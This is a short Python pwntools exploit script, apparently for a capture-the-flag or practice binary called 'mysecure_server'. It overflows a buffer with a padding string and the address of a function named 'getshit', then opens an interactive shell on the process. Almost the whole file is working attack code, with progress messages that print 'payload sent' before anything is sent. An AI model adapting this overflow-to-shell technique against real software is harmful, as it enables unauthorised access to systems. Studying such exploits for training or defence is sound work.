#!/usr/bin/python3

from pwn import *

class Exploit:
	def __init__(self):
		self.start = ELF("./mysecure_server")
		self.process = process("./mysecure_server")
		self.payload = b"aaaabaaacaaadaaaeaaaf" + p64(self.start.sym.getshit)
		self.progress = log.progress("")
		self.progress2 = log.progress("")
		self.p = log.progress("")
		self.p1 = log.progress("")
		self.prog = log.progress("")

	def exploit(self):
		try:
			if self.process:
				self.progress.status(f"exploiting Buffer_Overflow {cyclic(6)}\x40\x21\x56\x00\x00\x00 \n")
				self.progress2.status("sending payload")
				self.p.success("payload sent")
				self.p1.status("opening shell")
				self.process.sendline(self.payload)
				self.prog.success("pwned! Go ahead\n")
				self.process.interactive()
				print("\n")

		except:
			self.progress.failure("exploiting attempt failed!")

if __name__ == '__main__':
	exploitBinary = Exploit()
	exploitBinary.exploit()